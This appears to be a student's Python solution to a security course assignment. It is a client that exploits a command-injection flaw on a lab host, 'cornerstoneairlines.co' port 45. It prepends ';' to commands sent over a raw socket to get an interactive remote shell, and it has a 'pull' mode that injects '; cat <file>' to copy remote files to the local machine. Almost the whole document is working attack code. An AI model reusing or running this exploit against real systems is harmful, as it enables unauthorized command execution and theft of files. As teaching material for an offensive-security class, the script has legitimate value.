"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()
    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time

host = "cornerstoneairlines.co"  # IP address here
port = 45  # Port here

base = '/'


def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:
            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            Reading:
                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data
            Sending:
                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(4096)
    d = base
    if ('cd' in cmd):
        args = cmd.split(" ")
        if(args[1] != ".."):
            if(base == "/"):
                d = base+args[1]
            else:
                d = "{0}/{1}".format(base,args[1])
        else:
            dirs = (base.split("/"))
            dirs=dirs[:-1]
            if(base.count('/') != 1):
                d = ("/".join(dirs))
            else:
                d = "/"+("/".join(dirs))

    s.send(bytes(";cd {0}; {1}\n".format(base,cmd), 'utf8'))
    data = s.recv(4096)
    print(data.decode('utf8'))
    return d


if __name__ == '__main__':
    s = '>'
    while(1!=2):
        try:
            first_inp = input(s)
            if(first_inp == "shell"):
                while(2!=3):
                    inp = input(base+">")
                    if(inp == "exit"):
                        break
                    else:
                        base = execute_cmd(inp)
                s = ">"
            if("pull" in first_inp):
                shell = first_inp.split(" ")[1]
                cmds = first_inp.split(" ")[2]
                f = open(cmds, "wr+")
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                data = s.recv(4096)
                s.send(bytes("; cat {}\n".format(shell), 'utf8'))
                data = s.recv(4096)
                while(data):
                    f.write(data.decode('utf8'))
                    data = s.recv(4096)
                f.close()
        except:
            print("Try again")
